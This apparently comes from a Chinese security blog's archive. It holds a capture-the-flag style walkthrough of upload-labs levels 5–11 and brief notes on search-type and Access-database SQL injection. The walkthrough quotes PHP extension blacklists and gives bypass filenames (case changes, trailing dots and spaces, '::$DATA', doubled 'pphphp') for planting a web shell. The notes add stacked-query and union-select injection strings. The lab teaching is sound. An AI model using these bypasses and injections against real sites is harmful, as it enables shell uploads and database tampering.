class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>发现<code>.htaccess</code>在黑名单了，但我发现<code>PHP</code>并未被禁止，于是尝试抓包上传PHP后缀文件</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210724141808920.png" alt="image-20210724141808920"></p>
<p>成功上传并得到文件地址，使用菜刀连接即可。</p>
<h2 id="方法总结-4"><a href="#方法总结-4" class="headerlink" title="方法总结"></a>方法总结</h2><p>这关虽然过滤了<code>.htaccess</code>，但与第四关不同的是，他去掉了<code>$file_ext = strtolower($file_ext); //转换为小写</code>的操作，导致我们能使用大写字符绕过检测。再次证明，采用黑名单的形式来检测文件上传是不可靠的！</p>
<h1 id="Pass-06-后缀名末尾的空格绕过（Windows特性）"><a href="#Pass-06-后缀名末尾的空格绕过（Windows特性）" class="headerlink" title="Pass-06 - 后缀名末尾的空格绕过（Windows特性）"></a>Pass-06 - 后缀名末尾的空格绕过（Windows特性）</h1><h2 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h2><p>观察源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);<span class="comment">//查找到 . 最后一次出现的位置，获取从该位置开始一直到文件末尾的字符</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure>

<p>我们发现此处与之前的关卡相比，少了<strong>首尾去空</strong>的操作：<code>$file_ext = trim($file_ext); //首尾去空</code>。</p>
<p>那么这关是怎么处理文件名的呢 - 先删除末尾的点，查找到 <code>.</code> 最后一次出现的位置，获取从该位置开始一直到文件末尾的字符，再转换成小写、去掉<code>::$DATA</code>字符后得到最终的后缀名，去和上面的<code>deny_ext</code>做对比。那么我们可以想办法构造它的后缀名。</p>
<p>在Windows中，后缀名最后是不能带空格的，那么我们可以构造<code>shell.php .</code>，这样经过处理后，这里过滤器得到的后缀是<code>.php[空格] </code>，而黑名单中并没有此文件，于是绕过了过滤。加上在Windows中，就算我们上传的后缀名尾部是带空格的，系统也会在保存文件的时候自动给我们去掉空格，这样我们可以直接访问<code>shell.php</code>。</p>
<p>那么我们来测试下：</p>
<p> <img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210724143037092.png" alt="image-20210724143037092"></p>
<p>成功连接菜刀。</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210724143207754.png" alt="image-20210724143207754"></p>
<h2 id="方法总结-5"><a href="#方法总结-5" class="headerlink" title="方法总结"></a>方法总结</h2><p>学会阅读源码和查阅资料很重要。</p>
<p>比如</p>
<ul>
<li><p>这里的<code>strrchr()</code>方法是指查找到指定字符最后一次出现的位置，并获取从该位置开始一直到文件末尾的字符。</p>
</li>
<li><p>Windows中，后缀名最后是不能带空格的，会被自动去掉。</p>
</li>
</ul>
<p>有能力通过了解作者的代码，找出逻辑漏洞，这是学会Web安全的必要条件。</p>
<h1 id="Pass-07-后缀名末尾的点绕过（Windows特性）"><a href="#Pass-07-后缀名末尾的点绕过（Windows特性）" class="headerlink" title="Pass-07 - 后缀名末尾的点绕过（Windows特性）"></a>Pass-07 - 后缀名末尾的点绕过（Windows特性）</h1><h2 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h2><p>这一关，我们看源码，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>相比前一关，发现其并没有对末尾的点做处理。</p>
<p>根据<strong>Windows</strong>的特性 - 后缀名最后的点会被自动去掉，我们可以构造文件名<code>shell.php.</code>，这样获取到的后缀是<code>.</code>，能够绕过黑名单。在文件被保存在<code>windows</code>系统上后，后缀名最后的<code>.</code>会被自动去掉，我们访问<code>shell.php</code>即可。</p>
<p>演示：</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210724144725750.png" alt="image-20210724144725750"></p>
<p>菜刀连接成功：</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210724144838086.png" alt="image-20210724144838086"></p>
<h2 id="方法总结-6"><a href="#方法总结-6" class="headerlink" title="方法总结"></a>方法总结</h2><p>根据<strong>Windows</strong>的特性，后缀名最后的点会被自动去掉。利用逻辑漏洞解出题目。</p>
<h1 id="Pass-08-DATA文件流绕过（Windows特性）"><a href="#Pass-08-DATA文件流绕过（Windows特性）" class="headerlink" title="Pass-08 - $DATA文件流绕过（Windows特性）"></a>Pass-08 - $DATA文件流绕过（Windows特性）</h1><h2 id="NTFS文件流"><a href="#NTFS文件流" class="headerlink" title="NTFS文件流"></a>NTFS文件流</h2><p>在做这关之前，我们需要了解以下<code>NTFS</code>文件流。</p>
<blockquote>
<p><code>NTFS</code> 是微软 <code>NT</code> 系列内核支持的较为安全先进的磁盘文件格式。 <code>NTFS</code> 数据交换流（简称 <code>ADS</code> ）是 <code>NTFS</code> 磁盘的一个特性。每个文件都可以存在多个数据流，虽然我们无法看到数据流文件，但是它却是可以真实存在于我们的系统中的。</p>
</blockquote>
<p>平时我们看见的文件，其实它的全名是这样的：</p>
<p><code>&lt;filename&gt;:&lt;stream name&gt;:&lt;streamtype&gt;</code></p>
<p>即</p>
<p><code>&lt;文件名&gt;:&lt;流名称&gt;:&lt;流类型&gt;</code></p>
<p>用户不能创建一个新的流类型，流类型都是以$开头。</p>
<p>所有的<strong>文件</strong>在<code>NTFS</code>上，<strong>都至少包含一个流：主流（即DATA流）</strong>。</p>
<p>默认的<code>DATA</code>流是没有<strong>stream name</strong>的，如果一个文件被指派了流，但该流没有<strong>stream type</strong>的话，在储存时会自动添加<code>$DATA</code>，但在访问查询的时候需要去掉<code>$DATA</code>。</p>
<p>对于文件夹而言，没有<code>DATA</code>流，它的主流是<code>directory</code>流，( <code>stream type</code> 为 <code>$INDEX_ALLOCATION</code> ), <code>directory</code> 流默认的 <code>stream name</code> 是 <code>$130</code> 。</p>
<p>尽管文件夹默认没有 <code>data</code> 流，但用户可以指派 <code>data</code> 流。</p>
<h2 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h2><p>观察源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"> <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"> <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"> <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"> <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>发现此处并未检测<code>::Data</code></p>
<p>根据上文所讲，我们抓包修改上传文件名为<code>shell.php::DATA</code>，即指定文件名为<code>shell.php</code>，无流名，流类型为<code>DATA</code>。</p>
<p>当我们上传以后，过滤器判断出后缀是<code>.php::DATA</code>，黑名单中未查询到，于是我们可以绕过检测。但Windows文件在保存的时候，该数据流的格式名不会显示，所以实际上还是以<code>shell.php</code>的名字保存在服务器上的。</p>
<p>那么我们就可以开始操作了：</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210724152210037.png" alt="image-20210724152210037"></p>
<p>连接菜刀成功！</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210724152308213.png" alt="image-20210724152308213"></p>
<h2 id="方法总结-7"><a href="#方法总结-7" class="headerlink" title="方法总结"></a>方法总结</h2><p>Windows上的NTFS文件流帮助我们绕过后缀检测。这个有时间要好好了解下，后期还会遇到和NTFS文件流有关的绕过。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.gushiciku.cn/pl/2y05">Windows下的ADS NTFS交换数据流</a></p>
<h1 id="Pass-09-点空格点绕过-Windows特性"><a href="#Pass-09-点空格点绕过-Windows特性" class="headerlink" title="Pass-09 - 点空格点绕过(Windows特性)"></a>Pass-09 - 点空格点绕过(Windows特性)</h1><h2 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h2><p>观察源码，发现和<strong>pass07</strong>其实没有什么区别，这一关加了去掉末尾的点，但只去掉了一次。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>如果我们文件名是<code>. .</code>，删除文件名末尾的点后，文件后缀变成了<code>.[空格]</code>，接着去掉空格，最终检测的后缀名为<code>.</code>，这不是和<strong>Pass-09</strong>一样吗？</p>
<p>直接上burp修改：</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210729144343197.png" alt="image-20210729144343197"></p>
<p>上传成功。</p>
<p>上菜刀即可</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210729144504045.png" alt="image-20210729144504045"></p>
<h2 id="方法总结-8"><a href="#方法总结-8" class="headerlink" title="方法总结"></a>方法总结</h2><p>还是分析源码，找出逻辑问题。</p>
<p>了解Windows的特性，后缀名末尾的点或空格会被自动去掉。</p>
<h1 id="Pass-10-关键字替换绕过"><a href="#Pass-10-关键字替换绕过" class="headerlink" title="Pass-10 - 关键字替换绕过"></a>Pass-10 - 关键字替换绕过</h1><h2 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h2><p>我们直接上传一个<code>php</code>文件<code>shell.php</code>，发现上传成功。<img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210729150201358.png" alt="image-20210729150201358"></p>
<p>复制看看文件地址，发现文件地址是<code>http://127.0.0.1/upload/shell.</code>后面的php被去掉了，那么我们猜测应该是触发了黑名单，然后后缀名被替换为空了。</p>
<p>观察代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);<span class="comment">//替换deny_ext中的后缀为空</span></span><br></pre></td></tr></table></figure>

<p>那么我们可以构造以下文件名</p>
<p>test.p<strong>php</strong>hp</p>
<p>这样检测到<code>php</code>字段并替换为空，这样我们上传的文件名仍然为<code>test.php</code>。</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210729150320292.png" alt="image-20210729150320292"></p>
<p>连接菜刀：<img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210729150350556.png" alt="image-20210729150350556"></p>
<h2 id="方法总结-9"><a href="#方法总结-9" class="headerlink" title="方法总结"></a>方法总结</h2><p>直接替换非法后缀名是很不安全的，尽量使用白名单检测。</p>
<p>相对的，对于替换后缀名检测的方法，我们可以选择重复后缀进行绕过。</p>
<h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><h2 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h2><p>直接上传PHP文件，发现只能上传图片格式</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210729150848554.png" alt="image-20210729150848554"></p>
<p>抓包看看：</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>File Upload</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Write-up</tag>
        <tag>File Upload Vulnerability</tag>
      </tags>
  </entry>
  <entry>
    <title>关于搜索型、字符型注入以及参数加密</title>
    <url>/2021/06/11/%E5%85%B3%E4%BA%8E%E6%90%9C%E7%B4%A2%E5%9E%8B%E3%80%81%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<h1 id="搜索型、字符型注入"><a href="#搜索型、字符型注入" class="headerlink" title="搜索型、字符型注入"></a>搜索型、字符型注入</h1><span id="more"></span>

<p>一般搜索栏都会进行模糊搜索</p>
<p>$search=GET[‘x’]</p>
<p>可能会用到Select * from table where name like ‘%$search%’</p>
<p>所以搜索型字符一般都有引号，需要考虑引号闭合</p>
<p>字符型注入一样也会有引号，有些数字型也会有引号</p>
<h1 id="参数加密"><a href="#参数加密" class="headerlink" title="参数加密"></a>参数加密</h1><p>一些注入点会用md5、base64等方式进行加密，所以我们也需要加密后再进行注入</p>
<h1 id="SQL删除更新查询"><a href="#SQL删除更新查询" class="headerlink" title="SQL删除更新查询"></a>SQL删除更新查询</h1><p>注入时根据语句来构造语句</p>
<p>查询：<code>select * from zhibo_test.m_sms where id=1;</code></p>
<p>插入:<code>insert into zhibo_test.m_sms values(&#39;66&#39;,&#39;register&#39;,&#39;13345677654&#39;,&#39;1234&#39;,&#39;0&#39;,&#39;11.11.1.1&#39;,&#39;15345333321&#39;);</code></p>
<p>更新:<code>update zhibo_test.m_sms set username=&#39;xiaodi&#39; where id=27;</code></p>
<p>删除: <code>delete from m_sms where id=28;</code></p>
<p>多条叠加（堆叠测试）:<code>select * from m_sms; delete from m_sms where id=66;</code></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>SQL Injection</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>SQL Injection</tag>
      </tags>
  </entry>
  <entry>
    <title>不同数据库的SQL注入集合</title>
    <url>/2021/06/06/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<h1 id="ACCESS数据库注入（asp）"><a href="#ACCESS数据库注入（asp）" class="headerlink" title="ACCESS数据库注入（asp）"></a>ACCESS数据库注入（asp）</h1><span id="more"></span>

<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>一般用于ASP网站</strong></p>
<p><strong>access数据库结构：table, column, data</strong></p>
<p><strong>access数据库一般格式：xxx.mdb 数据库文件</strong></p>
<h2 id="注入语法"><a href="#注入语法" class="headerlink" title="注入语法"></a>注入语法</h2><p>猜解table,column的名字需要用到字典</p>
<p><strong>猜解列表个数</strong>：<code>order by 5;</code> -&gt; 按第五列排列，而数字表示第几个column，所以如果<code>order by 5</code>显示正常，但<code>order by 6;</code>不正常，说明这个table只有6个column.</p>
<p><strong>猜解表名：</strong><code>union select 1,2,3,4,5 from admin</code> -&gt; 看admin这个table是否存在</p>
<p><strong>猜解列名：</strong>根据页面返回的信息修改语句</p>
<p><code>union select 1,2,3,4,5,6,7,8 from news</code></p>
